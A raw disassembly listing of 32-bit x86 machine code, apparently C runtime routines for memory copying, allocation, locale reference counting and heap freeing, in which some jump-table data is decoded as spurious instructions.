  425f68:	push   DWORD PTR ds:0x467700
  425f6e:	call   DWORD PTR ds:0x4290dc
  425f74:	call   0x4252cb
  425f79:	ret    
  425f7a:	mov    esi,DWORD PTR [ebp+0x8]
  425f7d:	push   0x4
  425f7f:	call   0x4253bb
  425f84:	pop    ecx
  425f85:	ret    
  425f86:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  425f8b:	ja     0x425faf
  425f8d:	push   DWORD PTR [esp+0x4]
  425f91:	call   0x425f0b
  425f96:	test   eax,eax
  425f98:	pop    ecx
  425f99:	jne    0x425fb1
  425f9b:	cmp    DWORD PTR [esp+0x8],eax
  425f9f:	je     0x425fb1
  425fa1:	push   DWORD PTR [esp+0x4]
  425fa5:	call   0x427b72
  425faa:	test   eax,eax
  425fac:	pop    ecx
  425fad:	jne    0x425f8d
  425faf:	xor    eax,eax
  425fb1:	ret    
  425fb2:	push   DWORD PTR ds:0x467388
  425fb8:	push   DWORD PTR [esp+0x8]
  425fbc:	call   0x425f86
  425fc1:	pop    ecx
  425fc2:	pop    ecx
  425fc3:	ret    
  425fc4:	int3   
  425fc5:	int3   
  425fc6:	int3   
  425fc7:	int3   
  425fc8:	int3   
  425fc9:	int3   
  425fca:	int3   
  425fcb:	int3   
  425fcc:	int3   
  425fcd:	int3   
  425fce:	int3   
  425fcf:	int3   
  425fd0:	push   ebp
  425fd1:	mov    ebp,esp
  425fd3:	push   edi
  425fd4:	push   esi
  425fd5:	mov    esi,DWORD PTR [ebp+0xc]
  425fd8:	mov    ecx,DWORD PTR [ebp+0x10]
  425fdb:	mov    edi,DWORD PTR [ebp+0x8]
  425fde:	mov    eax,ecx
  425fe0:	mov    edx,ecx
  425fe2:	add    eax,esi
  425fe4:	cmp    edi,esi
  425fe6:	jbe    0x425ff0
  425fe8:	cmp    edi,eax
  425fea:	jb     0x42616c
  425ff0:	test   edi,0x3
  425ff6:	jne    0x42600c
  425ff8:	shr    ecx,0x2
  425ffb:	and    edx,0x3
  425ffe:	cmp    ecx,0x8
  426001:	jb     0x42602c
  426003:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426005:	jmp    DWORD PTR [edx*4+0x42611c]
  42600c:	mov    eax,edi
  42600e:	mov    edx,0x3
  426013:	sub    ecx,0x4
  426016:	jb     0x426024
  426018:	and    eax,0x3
  42601b:	add    ecx,eax
  42601d:	jmp    DWORD PTR [eax*4+0x426030]
  426024:	jmp    DWORD PTR [ecx*4+0x42612c]
  42602b:	nop
  42602c:	jmp    DWORD PTR [ecx*4+0x4260b0]
  426033:	nop
  426034:	inc    eax
  426035:	pusha  
  426036:	inc    edx
  426037:	add    BYTE PTR [eax+eiz*2+0x42],ch
  42603b:	add    BYTE PTR [eax+0x23004260],dl
  426041:	ror    DWORD PTR [edx-0x75f877fa],1
  426047:	inc    esi
  426048:	add    DWORD PTR [eax+0x468a0147],ecx
  42604e:	add    al,cl
  426050:	jmp    0x289e857
  426055:	add    esi,0x3
  426058:	add    edi,0x3
  42605b:	cmp    ecx,0x8
  42605e:	jb     0x42602c
  426060:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426062:	jmp    DWORD PTR [edx*4+0x42611c]
  426069:	lea    ecx,[ecx+0x0]
  42606c:	and    edx,ecx
  42606e:	mov    al,BYTE PTR [esi]
  426070:	mov    BYTE PTR [edi],al
  426072:	mov    al,BYTE PTR [esi+0x1]
  426075:	shr    ecx,0x2
  426078:	mov    BYTE PTR [edi+0x1],al
  42607b:	add    esi,0x2
  42607e:	add    edi,0x2
  426081:	cmp    ecx,0x8
  426084:	jb     0x42602c
  426086:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426088:	jmp    DWORD PTR [edx*4+0x42611c]
  42608f:	nop
  426090:	and    edx,ecx
  426092:	mov    al,BYTE PTR [esi]
  426094:	mov    BYTE PTR [edi],al
  426096:	add    esi,0x1
  426099:	shr    ecx,0x2
  42609c:	add    edi,0x1
  42609f:	cmp    ecx,0x8
  4260a2:	jb     0x42602c
  4260a4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260a6:	jmp    DWORD PTR [edx*4+0x42611c]
  4260ad:	lea    ecx,[ecx+0x0]
  4260b0:	adc    esp,DWORD PTR [ecx+0x42]
  4260b3:	add    BYTE PTR [eax],al
  4260b5:	popa   
  4260b6:	inc    edx
  4260b7:	add    al,bh
  4260b9:	pusha  
  4260ba:	inc    edx
  4260bb:	add    al,dh
  4260bd:	pusha  
  4260be:	inc    edx
  4260bf:	add    al,ch
  4260c1:	pusha  
  4260c2:	inc    edx
  4260c3:	add    al,ah
  4260c5:	pusha  
  4260c6:	inc    edx
  4260c7:	add    al,bl
  4260c9:	pusha  
  4260ca:	inc    edx
  4260cb:	add    al,dl
  4260cd:	pusha  
  4260ce:	inc    edx
  4260cf:	add    BYTE PTR [ebx-0x761b71bc],cl
  4260d5:	inc    esp
  4260d6:	(bad)  
  4260d7:	in     al,0x8b
  4260d9:	inc    esp
  4260da:	mov    gs,eax
  4260dc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4260e0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4260e4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4260e8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4260ec:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4260f0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4260f4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4260f8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4260fc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426100:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426104:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426108:	lea    eax,[ecx*4+0x0]
  42610f:	add    esi,eax
  426111:	add    edi,eax
  426113:	jmp    DWORD PTR [edx*4+0x42611c]
  42611a:	mov    edi,edi
  42611c:	sub    al,0x61
  42611e:	inc    edx
  42611f:	add    BYTE PTR [ecx+eiz*2],dh
  426122:	inc    edx
  426123:	add    BYTE PTR [eax+0x61],al
  426126:	inc    edx
  426127:	add    BYTE PTR [ecx+eiz*2+0x42],dl
  42612b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  426131:	leave  
  426132:	ret    
  426133:	nop
  426134:	mov    al,BYTE PTR [esi]
  426136:	mov    BYTE PTR [edi],al
  426138:	mov    eax,DWORD PTR [ebp+0x8]
  42613b:	pop    esi
  42613c:	pop    edi
  42613d:	leave  
  42613e:	ret    
  42613f:	nop
  426140:	mov    al,BYTE PTR [esi]
  426142:	mov    BYTE PTR [edi],al
  426144:	mov    al,BYTE PTR [esi+0x1]
  426147:	mov    BYTE PTR [edi+0x1],al
  42614a:	mov    eax,DWORD PTR [ebp+0x8]
  42614d:	pop    esi
  42614e:	pop    edi
  42614f:	leave  
  426150:	ret    
  426151:	lea    ecx,[ecx+0x0]
  426154:	mov    al,BYTE PTR [esi]
  426156:	mov    BYTE PTR [edi],al
  426158:	mov    al,BYTE PTR [esi+0x1]
  42615b:	mov    BYTE PTR [edi+0x1],al
  42615e:	mov    al,BYTE PTR [esi+0x2]
  426161:	mov    BYTE PTR [edi+0x2],al
  426164:	mov    eax,DWORD PTR [ebp+0x8]
  426167:	pop    esi
  426168:	pop    edi
  426169:	leave  
  42616a:	ret    
  42616b:	nop
  42616c:	lea    esi,[ecx+esi*1-0x4]
  426170:	lea    edi,[ecx+edi*1-0x4]
  426174:	test   edi,0x3
  42617a:	jne    0x4261a0
  42617c:	shr    ecx,0x2
  42617f:	and    edx,0x3
  426182:	cmp    ecx,0x8
  426185:	jb     0x426194
  426187:	std    
  426188:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42618a:	cld    
  42618b:	jmp    DWORD PTR [edx*4+0x4262b8]
  426192:	mov    edi,edi
  426194:	neg    ecx
  426196:	jmp    DWORD PTR [ecx*4+0x426268]
  42619d:	lea    ecx,[ecx+0x0]
  4261a0:	mov    eax,edi
  4261a2:	mov    edx,0x3
  4261a7:	cmp    ecx,0x4
  4261aa:	jb     0x4261b8
  4261ac:	and    eax,0x3
  4261af:	sub    ecx,eax
  4261b1:	jmp    DWORD PTR [eax*4+0x4261bc]
  4261b8:	jmp    DWORD PTR [ecx*4+0x4262b8]
  4261bf:	nop
  4261c0:	int3   
  4261c1:	popa   
  4261c2:	inc    edx
  4261c3:	add    al,dh
  4261c5:	popa   
  4261c6:	inc    edx
  4261c7:	add    BYTE PTR [eax],bl
  4261c9:	bound  eax,QWORD PTR [edx+0x0]
  4261cc:	mov    al,BYTE PTR [esi+0x3]
  4261cf:	and    edx,ecx
  4261d1:	mov    BYTE PTR [edi+0x3],al
  4261d4:	sub    esi,0x1
  4261d7:	shr    ecx,0x2
  4261da:	sub    edi,0x1
  4261dd:	cmp    ecx,0x8
  4261e0:	jb     0x426194
  4261e2:	std    
  4261e3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261e5:	cld    
  4261e6:	jmp    DWORD PTR [edx*4+0x4262b8]
  4261ed:	lea    ecx,[ecx+0x0]
  4261f0:	mov    al,BYTE PTR [esi+0x3]
  4261f3:	and    edx,ecx
  4261f5:	mov    BYTE PTR [edi+0x3],al
  4261f8:	mov    al,BYTE PTR [esi+0x2]
  4261fb:	shr    ecx,0x2
  4261fe:	mov    BYTE PTR [edi+0x2],al
  426201:	sub    esi,0x2
  426204:	sub    edi,0x2
  426207:	cmp    ecx,0x8
  42620a:	jb     0x426194
  42620c:	std    
  42620d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42620f:	cld    
  426210:	jmp    DWORD PTR [edx*4+0x4262b8]
  426217:	nop
  426218:	mov    al,BYTE PTR [esi+0x3]
  42621b:	and    edx,ecx
  42621d:	mov    BYTE PTR [edi+0x3],al
  426220:	mov    al,BYTE PTR [esi+0x2]
  426223:	mov    BYTE PTR [edi+0x2],al
  426226:	mov    al,BYTE PTR [esi+0x1]
  426229:	shr    ecx,0x2
  42622c:	mov    BYTE PTR [edi+0x1],al
  42622f:	sub    esi,0x3
  426232:	sub    edi,0x3
  426235:	cmp    ecx,0x8
  426238:	jb     0x426194
  42623e:	std    
  42623f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426241:	cld    
  426242:	jmp    DWORD PTR [edx*4+0x4262b8]
  426249:	lea    ecx,[ecx+0x0]
  42624c:	ins    BYTE PTR es:[edi],dx
  42624d:	bound  eax,QWORD PTR [edx+0x0]
  426250:	je     0x4262b4
  426252:	inc    edx
  426253:	add    BYTE PTR [edx+eiz*2+0x42],bh
  426257:	add    BYTE PTR [edx+eiz*2+0x628c0042],al
  42625e:	inc    edx
  42625f:	add    BYTE PTR [edx+eiz*2+0x629c0042],dl
  426266:	inc    edx
  426267:	add    BYTE PTR [edi-0x74ffbd9e],ch
  42626d:	inc    esp
  42626e:	mov    ds,WORD PTR [ecx+ecx*4]
  426271:	inc    esp
  426272:	(bad)  
  426273:	sbb    al,0x8b
  426275:	inc    esp
  426276:	mov    ds,WORD PTR [eax]
  426278:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42627c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426280:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426284:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426288:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42628c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426290:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426294:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426298:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42629c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4262a0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4262a4:	lea    eax,[ecx*4+0x0]
  4262ab:	add    esi,eax
  4262ad:	add    edi,eax
  4262af:	jmp    DWORD PTR [edx*4+0x4262b8]
  4262b6:	mov    edi,edi
  4262b8:	enter  0x4262,0x0
  4262bc:	shl    BYTE PTR [edx+0x42],1
  4262bf:	add    al,ah
  4262c1:	bound  eax,QWORD PTR [edx+0x0]
  4262c4:	hlt    
  4262c5:	bound  eax,QWORD PTR [edx+0x0]
  4262c8:	mov    eax,DWORD PTR [ebp+0x8]
  4262cb:	pop    esi
  4262cc:	pop    edi
  4262cd:	leave  
  4262ce:	ret    
  4262cf:	nop
  4262d0:	mov    al,BYTE PTR [esi+0x3]
  4262d3:	mov    BYTE PTR [edi+0x3],al
  4262d6:	mov    eax,DWORD PTR [ebp+0x8]
  4262d9:	pop    esi
  4262da:	pop    edi
  4262db:	leave  
  4262dc:	ret    
  4262dd:	lea    ecx,[ecx+0x0]
  4262e0:	mov    al,BYTE PTR [esi+0x3]
  4262e3:	mov    BYTE PTR [edi+0x3],al
  4262e6:	mov    al,BYTE PTR [esi+0x2]
  4262e9:	mov    BYTE PTR [edi+0x2],al
  4262ec:	mov    eax,DWORD PTR [ebp+0x8]
  4262ef:	pop    esi
  4262f0:	pop    edi
  4262f1:	leave  
  4262f2:	ret    
  4262f3:	nop
  4262f4:	mov    al,BYTE PTR [esi+0x3]
  4262f7:	mov    BYTE PTR [edi+0x3],al
  4262fa:	mov    al,BYTE PTR [esi+0x2]
  4262fd:	mov    BYTE PTR [edi+0x2],al
  426300:	mov    al,BYTE PTR [esi+0x1]
  426303:	mov    BYTE PTR [edi+0x1],al
  426306:	mov    eax,DWORD PTR [ebp+0x8]
  426309:	pop    esi
  42630a:	pop    edi
  42630b:	leave  
  42630c:	ret    
  42630d:	push   DWORD PTR [esp+0x4]
  426311:	call   DWORD PTR ds:0x4290e0
  426317:	xor    eax,eax
  426319:	inc    eax
  42631a:	ret    0x8
  42631d:	push   0x10
  42631f:	push   0x429618
  426324:	call   0x425290
  426329:	mov    eax,ds:0x467348
  42632e:	test   eax,eax
  426330:	jne    0x426369
  426332:	cmp    DWORD PTR ds:0x467084,0x1
  426339:	je     0x42635f
  42633b:	push   0x429604
  426340:	call   DWORD PTR ds:0x429044
  426346:	test   eax,eax
  426348:	je     0x42635f
  42634a:	push   0x4295dc
  42634f:	push   eax
  426350:	call   DWORD PTR ds:0x429048
  426356:	mov    ds:0x467348,eax
  42635b:	test   eax,eax
  42635d:	jne    0x426369
  42635f:	mov    eax,0x42630d
  426364:	mov    ds:0x467348,eax
  426369:	and    DWORD PTR [ebp-0x4],0x0
  42636d:	push   DWORD PTR [ebp+0xc]
  426370:	push   DWORD PTR [ebp+0x8]
  426373:	call   eax
  426375:	mov    DWORD PTR [ebp-0x1c],eax
  426378:	jmp    0x42639e
  42637a:	mov    eax,DWORD PTR [ebp-0x14]
  42637d:	mov    eax,DWORD PTR [eax]
  42637f:	mov    eax,DWORD PTR [eax]
  426381:	mov    DWORD PTR [ebp-0x20],eax
  426384:	xor    eax,eax
  426386:	inc    eax
  426387:	ret    
  426388:	mov    esp,DWORD PTR [ebp-0x18]
  42638b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426392:	jne    0x42639c
  426394:	push   0x8
  426396:	call   DWORD PTR ds:0x4290b0
  42639c:	xor    eax,eax
  42639e:	or     DWORD PTR [ebp-0x4],0xffffffff
  4263a2:	call   0x4252cb
  4263a7:	ret    
  4263a8:	push   0x10
  4263aa:	push   0x429628
  4263af:	call   0x425290
  4263b4:	mov    esi,DWORD PTR [ebp+0x8]
  4263b7:	imul   esi,DWORD PTR [ebp+0xc]
  4263bb:	mov    DWORD PTR [ebp-0x1c],esi
  4263be:	test   esi,esi
  4263c0:	jne    0x4263c3
  4263c2:	inc    esi
  4263c3:	xor    edi,edi
  4263c5:	mov    DWORD PTR [ebp-0x20],edi
  4263c8:	cmp    esi,0xffffffe0
  4263cb:	ja     0x426432
  4263cd:	cmp    DWORD PTR ds:0x467704,0x3
  4263d4:	jne    0x42641d
  4263d6:	add    esi,0xf
  4263d9:	and    esi,0xfffffff0
  4263dc:	mov    DWORD PTR [ebp+0xc],esi
  4263df:	mov    ebx,DWORD PTR [ebp-0x1c]
  4263e2:	cmp    ebx,DWORD PTR ds:0x4674c4
  4263e8:	ja     0x42641d
  4263ea:	push   0x4
  4263ec:	call   0x42544f
  4263f1:	pop    ecx
  4263f2:	and    DWORD PTR [ebp-0x4],edi
  4263f5:	push   ebx
  4263f6:	call   0x426e51
  4263fb:	pop    ecx
  4263fc:	mov    DWORD PTR [ebp-0x20],eax
  4263ff:	or     DWORD PTR [ebp-0x4],0xffffffff
  426403:	call   0x426452
  426408:	mov    edi,DWORD PTR [ebp-0x20]
  42640b:	test   edi,edi
  42640d:	je     0x426421
  42640f:	push   DWORD PTR [ebp-0x1c]
  426412:	push   0x0
  426414:	push   edi
  426415:	call   0x427b90
  42641a:	add    esp,0xc
  42641d:	test   edi,edi
  42641f:	jne    0x42645b
  426421:	push   esi
  426422:	push   0x8
  426424:	push   DWORD PTR ds:0x467700
  42642a:	call   DWORD PTR ds:0x4290dc
  426430:	mov    edi,eax
  426432:	test   edi,edi
  426434:	jne    0x42645b
  426436:	cmp    DWORD PTR ds:0x467388,edi
  42643c:	je     0x42645b
  42643e:	push   esi
  42643f:	call   0x427b72
  426444:	pop    ecx
  426445:	test   eax,eax
  426447:	jne    0x4263c3
  42644d:	jmp    0x42645d
  42644f:	mov    esi,DWORD PTR [ebp+0xc]
  426452:	push   0x4
  426454:	call   0x4253bb
  426459:	pop    ecx
  42645a:	ret    
  42645b:	mov    eax,edi
  42645d:	call   0x4252cb
  426462:	ret    
  426463:	push   esi
  426464:	mov    esi,DWORD PTR [esp+0x8]
  426468:	mov    eax,DWORD PTR [esi+0x3c]
  42646b:	push   edi
  42646c:	xor    edi,edi
  42646e:	cmp    eax,DWORD PTR ds:0x467394
  426474:	je     0x4264d9
  426476:	cmp    eax,edi
  426478:	je     0x4264d9
  42647a:	mov    eax,DWORD PTR [esi+0x2c]
  42647d:	cmp    DWORD PTR [eax],edi
  42647f:	jne    0x4264d9
  426481:	mov    eax,DWORD PTR [esi+0x34]
  426484:	cmp    eax,edi
  426486:	je     0x4264a4
  426488:	cmp    DWORD PTR [eax],edi
  42648a:	jne    0x4264a4
  42648c:	cmp    eax,DWORD PTR ds:0x4674b0
  426492:	je     0x4264a4
  426494:	push   eax
  426495:	call   0x425e9a
  42649a:	push   DWORD PTR [esi+0x3c]
  42649d:	call   0x427ddf
  4264a2:	pop    ecx
  4264a3:	pop    ecx
  4264a4:	mov    eax,DWORD PTR [esi+0x30]
  4264a7:	cmp    eax,edi
  4264a9:	je     0x4264c7
  4264ab:	cmp    DWORD PTR [eax],edi
  4264ad:	jne    0x4264c7
  4264af:	cmp    eax,DWORD PTR ds:0x4674b4
  4264b5:	je     0x4264c7
  4264b7:	push   eax
  4264b8:	call   0x425e9a
  4264bd:	push   DWORD PTR [esi+0x3c]
  4264c0:	call   0x427d80
  4264c5:	pop    ecx
  4264c6:	pop    ecx
  4264c7:	push   DWORD PTR [esi+0x2c]
  4264ca:	call   0x425e9a
  4264cf:	push   DWORD PTR [esi+0x3c]
  4264d2:	call   0x425e9a
  4264d7:	pop    ecx
  4264d8:	pop    ecx
  4264d9:	mov    eax,DWORD PTR [esi+0x40]
  4264dc:	cmp    eax,DWORD PTR ds:0x4674ac
  4264e2:	je     0x4264fc
  4264e4:	cmp    eax,edi
  4264e6:	je     0x4264fc
  4264e8:	cmp    DWORD PTR [eax],edi
  4264ea:	jne    0x4264fc
  4264ec:	push   eax
  4264ed:	call   0x425e9a
  4264f2:	push   DWORD PTR [esi+0x44]
  4264f5:	call   0x425e9a
  4264fa:	pop    ecx
  4264fb:	pop    ecx
  4264fc:	mov    eax,DWORD PTR [esi+0x50]
  4264ff:	cmp    eax,DWORD PTR ds:0x467390
  426505:	je     0x426523
  426507:	cmp    eax,edi
  426509:	je     0x426523
  42650b:	cmp    DWORD PTR [eax+0xb4],edi
  426511:	jne    0x426523
  426513:	push   eax
  426514:	call   0x427bf0
  426519:	push   DWORD PTR [esi+0x50]
  42651c:	call   0x425e9a
  426521:	pop    ecx
  426522:	pop    ecx
  426523:	push   esi
  426524:	call   0x425e9a
  426529:	pop    ecx
  42652a:	pop    edi
  42652b:	pop    esi
  42652c:	ret    
  42652d:	push   esi
  42652e:	call   0x425145
  426533:	mov    esi,eax
  426535:	mov    eax,DWORD PTR [esi+0x64]
  426538:	cmp    eax,DWORD PTR ds:0x466b4c
  42653e:	je     0x4265ea
  426544:	test   eax,eax
  426546:	je     0x426577
  426548:	mov    ecx,DWORD PTR [eax+0x2c]
  42654b:	dec    DWORD PTR [eax]
  42654d:	test   ecx,ecx
  42654f:	je     0x426553
  426551:	dec    DWORD PTR [ecx]
  426553:	mov    ecx,DWORD PTR [eax+0x34]
  426556:	test   ecx,ecx
  426558:	je     0x42655c
  42655a:	dec    DWORD PTR [ecx]
  42655c:	mov    ecx,DWORD PTR [eax+0x30]
  42655f:	test   ecx,ecx
  426561:	je     0x426565
  426563:	dec    DWORD PTR [ecx]
  426565:	mov    ecx,DWORD PTR [eax+0x40]
  426568:	test   ecx,ecx
  42656a:	je     0x42656e
  42656c:	dec    DWORD PTR [ecx]
  42656e:	mov    ecx,DWORD PTR [eax+0x4c]
  426571:	dec    DWORD PTR [ecx+0xb4]
  426577:	mov    ecx,DWORD PTR ds:0x466b4c
  42657d:	mov    DWORD PTR [esi+0x64],ecx
  426580:	mov    ecx,DWORD PTR ds:0x466b4c
  426586:	inc    DWORD PTR [ecx]
  426588:	mov    ecx,DWORD PTR ds:0x466b4c
  42658e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426591:	test   ecx,ecx
  426593:	je     0x426597
  426595:	inc    DWORD PTR [ecx]
  426597:	mov    ecx,DWORD PTR ds:0x466b4c
  42659d:	mov    ecx,DWORD PTR [ecx+0x34]
  4265a0:	test   ecx,ecx
  4265a2:	je     0x4265a6
  4265a4:	inc    DWORD PTR [ecx]
  4265a6:	mov    ecx,DWORD PTR ds:0x466b4c
  4265ac:	mov    ecx,DWORD PTR [ecx+0x30]
  4265af:	test   ecx,ecx
  4265b1:	je     0x4265b5
  4265b3:	inc    DWORD PTR [ecx]
  4265b5:	mov    ecx,DWORD PTR ds:0x466b4c
  4265bb:	mov    ecx,DWORD PTR [ecx+0x40]
  4265be:	test   ecx,ecx
  4265c0:	je     0x4265c4
  4265c2:	inc    DWORD PTR [ecx]
  4265c4:	mov    ecx,DWORD PTR ds:0x466b4c
  4265ca:	mov    ecx,DWORD PTR [ecx+0x4c]
  4265cd:	inc    DWORD PTR [ecx+0xb4]
  4265d3:	test   eax,eax
  4265d5:	je     0x4265ea
  4265d7:	cmp    DWORD PTR [eax],0x0
  4265da:	jne    0x4265ea
  4265dc:	cmp    eax,0x466af8
  4265e1:	je     0x4265ea
  4265e3:	push   eax
  4265e4:	call   0x426463
  4265e9:	pop    ecx
  4265ea:	mov    eax,DWORD PTR [esi+0x64]
  4265ed:	pop    esi
  4265ee:	ret    
  4265ef:	push   0xc
  4265f1:	push   0x4297b8
  4265f6:	call   0x425290
  4265fb:	push   0xc
  4265fd:	call   0x42544f
  426602:	pop    ecx
  426603:	and    DWORD PTR [ebp-0x4],0x0
  426607:	call   0x42652d
  42660c:	mov    DWORD PTR [ebp-0x1c],eax
  42660f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426613:	call   0x426621
  426618:	mov    eax,DWORD PTR [ebp-0x1c]
  42661b:	call   0x4252cb
  426620:	ret    
  426621:	push   0xc
  426623:	call   0x4253bb
  426628:	pop    ecx
  426629:	ret    
  42662a:	push   0x140
  42662f:	push   0x0
  426631:	push   DWORD PTR ds:0x467700
  426637:	call   DWORD PTR ds:0x4290dc
  42663d:	test   eax,eax
  42663f:	mov    ds:0x4674c0,eax
  426644:	jne    0x426647
  426646:	ret    
  426647:	mov    ecx,DWORD PTR [esp+0x4]
  42664b:	and    DWORD PTR ds:0x4674b8,0x0
  426652:	and    DWORD PTR ds:0x4674bc,0x0
  426659:	mov    ds:0x4674c8,eax
  42665e:	xor    eax,eax
  426660:	mov    DWORD PTR ds:0x4674c4,ecx
  426666:	mov    DWORD PTR ds:0x4674cc,0x10
  426670:	inc    eax
  426671:	ret    
  426672:	mov    eax,ds:0x4674bc
  426677:	lea    ecx,[eax+eax*4]
  42667a:	mov    eax,ds:0x4674c0
  42667f:	lea    ecx,[eax+ecx*4]
  426682:	jmp    0x426696
  426684:	mov    edx,DWORD PTR [esp+0x4]
  426688:	sub    edx,DWORD PTR [eax+0xc]
  42668b:	cmp    edx,0x100000
  426691:	jb     0x42669c
  426693:	add    eax,0x14
  426696:	cmp    eax,ecx
  426698:	jb     0x426684
  42669a:	xor    eax,eax
  42669c:	ret    
  42669d:	push   ebp
  42669e:	mov    ebp,esp
  4266a0:	sub    esp,0x10
  4266a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4266a6:	mov    eax,DWORD PTR [ecx+0x10]
  4266a9:	push   esi
  4266aa:	mov    esi,DWORD PTR [ebp+0xc]
  4266ad:	push   edi
  4266ae:	mov    edi,esi
  4266b0:	sub    edi,DWORD PTR [ecx+0xc]
  4266b3:	add    esi,0xfffffffc
  4266b6:	shr    edi,0xf
  4266b9:	mov    ecx,edi
  4266bb:	imul   ecx,ecx,0x204
  4266c1:	lea    ecx,[ecx+eax*1+0x144]
  4266c8:	mov    DWORD PTR [ebp-0x10],ecx
  4266cb:	mov    ecx,DWORD PTR [esi]
  4266cd:	dec    ecx
  4266ce:	test   cl,0x1
  4266d1:	mov    DWORD PTR [ebp-0x4],ecx
  4266d4:	jne    0x4269b1
  4266da:	push   ebx
  4266db:	lea    ebx,[ecx+esi*1]
  4266de:	mov    edx,DWORD PTR [ebx]
  4266e0:	mov    DWORD PTR [ebp-0xc],edx
  4266e3:	mov    edx,DWORD PTR [esi-0x4]
  4266e6:	mov    DWORD PTR [ebp-0x8],edx
  4266e9:	mov    edx,DWORD PTR [ebp-0xc]
  4266ec:	test   dl,0x1
  4266ef:	mov    DWORD PTR [ebp+0xc],ebx
  4266f2:	jne    0x426768
  4266f4:	sar    edx,0x4
  4266f7:	dec    edx
  4266f8:	cmp    edx,0x3f
  4266fb:	jbe    0x426700
  4266fd:	push   0x3f
  4266ff:	pop    edx
  426700:	mov    ecx,DWORD PTR [ebx+0x4]
  426703:	cmp    ecx,DWORD PTR [ebx+0x8]
  426706:	jne    0x42674a
  426708:	cmp    edx,0x20
  42670b:	mov    ebx,0x80000000
  426710:	jae    0x42672b
  426712:	mov    ecx,edx
  426714:	shr    ebx,cl
  426716:	lea    ecx,[edx+eax*1+0x4]
  42671a:	not    ebx
  42671c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  426720:	dec    BYTE PTR [ecx]
  426722:	jne    0x426747
  426724:	mov    ecx,DWORD PTR [ebp+0x8]
  426727:	and    DWORD PTR [ecx],ebx
  426729:	jmp    0x426747
  42672b:	lea    ecx,[edx-0x20]
  42672e:	shr    ebx,cl
  426730:	lea    ecx,[edx+eax*1+0x4]
  426734:	not    ebx
  426736:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  42673d:	dec    BYTE PTR [ecx]
  42673f:	jne    0x426747
  426741:	mov    ecx,DWORD PTR [ebp+0x8]
  426744:	and    DWORD PTR [ecx+0x4],ebx
  426747:	mov    ebx,DWORD PTR [ebp+0xc]
  42674a:	mov    edx,DWORD PTR [ebx+0x8]
  42674d:	mov    ebx,DWORD PTR [ebx+0x4]
  426750:	mov    ecx,DWORD PTR [ebp-0x4]
  426753:	add    ecx,DWORD PTR [ebp-0xc]
  426756:	mov    DWORD PTR [edx+0x4],ebx
  426759:	mov    edx,DWORD PTR [ebp+0xc]
  42675c:	mov    ebx,DWORD PTR [edx+0x4]
  42675f:	mov    edx,DWORD PTR [edx+0x8]
  426762:	mov    DWORD PTR [ebx+0x8],edx
  426765:	mov    DWORD PTR [ebp-0x4],ecx
  426768:	mov    edx,ecx
  42676a:	sar    edx,0x4
  42676d:	dec    edx
  42676e:	cmp    edx,0x3f
  426771:	jbe    0x426776
  426773:	push   0x3f
  426775:	pop    edx
  426776:	mov    ebx,DWORD PTR [ebp-0x8]
  426779:	and    ebx,0x1
  42677c:	mov    DWORD PTR [ebp-0xc],ebx
  42677f:	jne    0x426814
  426785:	sub    esi,DWORD PTR [ebp-0x8]
  426788:	mov    ebx,DWORD PTR [ebp-0x8]
  42678b:	sar    ebx,0x4
  42678e:	push   0x3f
  426790:	mov    DWORD PTR [ebp+0xc],esi
  426793:	dec    ebx
  426794:	pop    esi
  426795:	cmp    ebx,esi
  426797:	jbe    0x42679b
  426799:	mov    ebx,esi
  42679b:	add    ecx,DWORD PTR [ebp-0x8]
  42679e:	mov    edx,ecx
  4267a0:	sar    edx,0x4
  4267a3:	dec    edx
  4267a4:	cmp    edx,esi
  4267a6:	mov    DWORD PTR [ebp-0x4],ecx
  4267a9:	jbe    0x4267ad
  4267ab:	mov    edx,esi
  4267ad:	cmp    ebx,edx
  4267af:	je     0x42680f
  4267b1:	mov    ecx,DWORD PTR [ebp+0xc]
  4267b4:	mov    esi,DWORD PTR [ecx+0x4]
  4267b7:	cmp    esi,DWORD PTR [ecx+0x8]
  4267ba:	jne    0x4267f7
  4267bc:	cmp    ebx,0x20
  4267bf:	mov    esi,0x80000000
  4267c4:	jae    0x4267dd
  4267c6:	mov    ecx,ebx
  4267c8:	shr    esi,cl
  4267ca:	not    esi
  4267cc:	and    DWORD PTR [eax+edi*4+0x44],esi
  4267d0:	dec    BYTE PTR [ebx+eax*1+0x4]
  4267d4:	jne    0x4267f7
  4267d6:	mov    ecx,DWORD PTR [ebp+0x8]
